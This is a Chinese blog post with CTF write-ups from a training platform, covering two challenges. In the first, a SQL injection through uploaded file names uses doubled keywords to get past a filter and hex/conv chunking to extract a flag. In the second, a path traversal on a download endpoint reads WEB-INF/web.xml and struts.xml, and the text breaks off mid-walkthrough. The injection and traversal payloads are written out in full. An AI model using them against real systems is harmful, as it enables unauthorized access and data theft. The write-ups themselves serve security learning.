<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>攻防世界(二) | wanan</title><meta name="keywords" content="CTF,攻防世界"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="攻防世界upload扫目录  有几个配置文件  里面也发现不了什么东西,只能回到register页面 注册一个登进去,发现是一个上传目录的地方 小传一个,回显名称,文件链接呢  说是注入漏洞,我们之间select database()发现只剩下databse() select被替换为了空,那么我们先fuzz一下  这里直接双写绕过过滤 猜测它直接将我们上传的文件存入了数据库那可能通过文件进行sql">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界(二)">
<meta property="og:url" content="https://www.wanan.red/b9fabd21.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="攻防世界upload扫目录  有几个配置文件  里面也发现不了什么东西,只能回到register页面 注册一个登进去,发现是一个上传目录的地方 小传一个,回显名称,文件链接呢  说是注入漏洞,我们之间select database()发现只剩下databse() select被替换为了空,那么我们先fuzz一下  这里直接双写绕过过滤 猜测它直接将我们上传的文件存入了数据库那可能通过文件进行sql">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png">
<meta property="article:published_time" content="2022-10-18T15:01:57.656Z">
<meta property="article:modified_time" content="2022-11-25T09:30:43.224Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="攻防世界">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/b9fabd21"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-h7qMMwh8fd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?0a85e115f35e16b8da9503b0d77633ca";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-FYB0HL88QE');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '攻防世界(二)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-25 17:30:43'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">99</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">83</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界(二)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-18T15:01:57.656Z" title="发表于 2022-10-18 23:01:57">2022-10-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-25T09:30:43.224Z" title="更新于 2022-11-25 17:30:43">2022-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">19.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>83分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界(二)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="攻防世界upload"><a href="#攻防世界upload" class="headerlink" title="攻防世界upload"></a>攻防世界upload</h1><p>扫目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142147854-16661016766351.png" alt="image-20220314214713805"></p>
<p>有几个配置文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142147604.png" alt="image-20220314214755557"></p>
<p>里面也发现不了什么东西,只能回到register页面</p>
<p>注册一个登进去,发现是一个上传目录的地方</p>
<p>小传一个,回显名称,文件链接呢</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142152589.png" alt="image-20220314215208538"></p>
<p>说是注入漏洞,我们之间select database()发现只剩下databse() select被替换为了空,那么我们先fuzz一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142203298.png" alt="image-20220314220327233"></p>
<p>这里直接双写绕过过滤</p>
<p>猜测它直接将我们上传的文件存入了数据库<br>那可能通过文件进行sql注入？<br>类似insert into 表名(‘filename’,…) values(‘上传的文件名’,…);这样</p>
<p>构造’ select database() ‘.jpg上传<br>结果被过滤了</p>
<p>猜测是select或空格被过滤<br>都改掉：双写select，空格用“+”<br>构造’+(selselectect database())+’.jpg<br>返回0<br><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142215072.png" alt="image-20220314221515010"></p>
<pre><code>CONV()：进制的转换
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONV(N,from_base,to_base)</span><br><span class="line">select conv(16,10,16);</span><br><span class="line">+—————-+</span><br><span class="line">| conv(16,10,16) |</span><br><span class="line">+—————-+</span><br><span class="line">| 10 |</span><br><span class="line">+—————-+</span><br><span class="line">1 row in set (0.04 sec)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N是要转换的数据，from_base是原进制，to_base是目标进制</span><br><span class="line">如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(-16,10,16);</span><br><span class="line">+——————+</span><br><span class="line">| conv(-16,10,16) |</span><br><span class="line">+——————+</span><br><span class="line">| FFFFFFFFFFFFFFF0 |</span><br><span class="line">+——————+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select conv(-16,10,-16);</span><br><span class="line">+——————+</span><br><span class="line">| conv(-16,10,-16) |</span><br><span class="line">+——————+</span><br><span class="line">| -10 |</span><br><span class="line">+——————+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr（）：搜索字符串</span><br><span class="line"></span><br><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串，start为起始位置，length为长度。</span><br><span class="line">mysql中的start是从1开始的，而hibernate中的start是从0开始的。</span><br></pre></td></tr></table></figure>

<p>所以构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt substr(database(),1,12))+&#x27;</span><br></pre></td></tr></table></figure>

<p>又返回一个0</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142219737.png" alt="image-20220314221936675"></p>
<p>这里将database进行16进制转码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt substr(hex(database()),1,12))+&#x27;</span><br></pre></td></tr></table></figure>

<p>返回了一个7765625</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142222869.png" alt="image-20220314222207808"></p>
<p>但是当进行16进制转字符串时却发现,并不是完整数据</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142223283.png" alt="image-20220314222322257"></p>
<p>说明有截断</p>
<p>那么就使用conv将16进制转换为10进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex(database()),1,12),16,10))+&#x27;</span><br></pre></td></tr></table></figure>

<p>至于这里为什么要截取呢那是因为13太长了转换成十进制会造成科学计数法</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142229598.png" alt="image-20220314222928570"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex(database()),1,12),16,10))+&#x27;</span><br><span class="line">#web_up</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex(database()),13,12),16,10))+&#x27;</span><br><span class="line">#load</span><br><span class="line">database:web_upload</span><br></pre></td></tr></table></figure>

<p>接着注入表的时候发现from被过滤了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203142235210.png" alt="image-20220314223529159"></p>
<p>再次双写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#x27;web_upload&#x27;)),1,12),16,10))+&#x27;</span><br><span class="line">#files,</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#x27;web_upload&#x27;)),13,12),16,10))+&#x27;</span><br><span class="line">#hello_</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#x27;web_upload&#x27;)),25,12),16,10))+&#x27;</span><br><span class="line">#flag_i</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#x27;web_upload&#x27;)),37,12),16,10))+&#x27;</span><br><span class="line">#s_here</span><br><span class="line">#hello_flag_is_here</span><br></pre></td></tr></table></figure>

<p>得到字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(column_name) frfromom information_schema.columns where table_name=&#x27;hello_flag_is_here&#x27;)),1,12),16,10))+&#x27;</span><br><span class="line">#i_am_f</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(column_name) frfromom information_schema.columns where table_name=&#x27;hello_flag_is_here&#x27;)),13,12),16,10))+&#x27;</span><br><span class="line">#lag</span><br><span class="line">#i_am_flag</span><br></pre></td></tr></table></figure>

<p>得到数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+&#x27;</span><br><span class="line">#!!_@m_</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),13,12),16,10))+&#x27;</span><br><span class="line">#Th.e_F</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),25,12),16,10))+&#x27;</span><br><span class="line">#!lag</span><br><span class="line">#!!_@m_Th.e_F!lag</span><br></pre></td></tr></table></figure>

<h1 id="攻防世界Zhuanxv"><a href="#攻防世界Zhuanxv" class="headerlink" title="攻防世界Zhuanxv"></a>攻防世界Zhuanxv</h1><h2 id="文件包含下载文件"><a href="#文件包含下载文件" class="headerlink" title="文件包含下载文件"></a>文件包含下载文件</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/bvPVYlpLIC8Utoe.png" alt="image-20220308150856182"></p>
<p>打开之后可以发现一个时钟页面,这里边点点看,边扫一下目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/lvSGAZ1Fn3pQxsi.png" alt="image-20220308151039296"></p>
<p>挨个打开看看,发现在list下面有一个登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/jdhlzSLFcaoNQqb.png" alt="image-20220308151206877"></p>
<p>这里随便点点,抓包看着点</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/rePz9LG6lhAMb3N.png" alt="image-20220308151344673"></p>
<p>发现有jsession ,但是这里为什么就能确定是java写的呢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie</span><br><span class="line">“jsessionid是一个Cookie，可以通过在URL后面加上“;jsessionid=xxx”来传递“session id”；其中Servlet容器用来记录用户session，当我们创建回话时会自动创建，用来记录用户的访问记录。</span><br></pre></td></tr></table></figure>

<p>紧接着发现一个疑似文件包含的漏洞,一般考Java的题目都会想办法给出源码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/NBLTvb4lKtO7GVj.png" alt="image-20220308151613489"></p>
<p>那么这里利用这个去尝试去读取..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/loadimage?fileName=../../WEB-INF/web.xml</span><br><span class="line"></span><br><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</span><br><span class="line"></span><br><span class="line">WEB-INF主要包含一下文件或目录：</span><br><span class="line"></span><br><span class="line">- `/WEB-INF/web.xml`：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">- `/WEB-INF/classes/`：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">- `/WEB-INF/lib/`：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">- `/WEB-INF/src/`：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">- `/WEB-INF/database.properties`：数据库配置文件</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203081541285.png" alt="image-20220308152100940"></p>
<p>有一个struts2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apps-存放了所有Struts2的示例项目</span><br><span class="line"></span><br><span class="line">docs-存放了所有Struts2与XWork的文档</span><br><span class="line"></span><br><span class="line">lib-存放了所有Struts2相关的JAR文件以及Struts2运行时所依赖的JAR文件</span><br><span class="line"></span><br><span class="line">src-存放了所有Struts2的源码，以Maven所指定的项目结构目录存放</span><br></pre></td></tr></table></figure>

<p>这里接着读取struts.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/loadimage?fileName=../../WEB-INF/classes/struts.xml</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment;filename=&quot;bg.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">Date: Tue, 08 Mar 2022 07:45:12 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 2243</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;strutsenableDynamicMethodInvocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.mapper.alwaysSelectFullNamespace&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.action.extension&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;front&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exception-mapping</span> <span class="attr">exception</span>=<span class="string">&quot;java.lang.Exception&quot;</span> <span class="attr">result</span>=<span class="string">&quot;error&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;zhuanxvlogin&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.UserLoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loadimage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.DownloadAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;stream&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentType&quot;</span>&gt;</span>image/jpeg<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentDisposition&quot;</span>&gt;</span>attachment;filename=&quot;bg.jpg&quot;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;inputName&quot;</span>&gt;</span>downloadFile<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;suffix_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;back&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.util.UserOAuth&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.AdminAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;excludeMethods&quot;</span>&gt;</span></span><br><span class="line">                    execute</span><br><span class="line">                <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;login_error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;list_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里有些class文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;zhuanxvlogin&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.UserLoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loadimage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.DownloadAction&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.util.UserOAuth&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.AdminAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里试着下载class文件试试,将.替换为&#x2F;再在末尾添加.class</p>
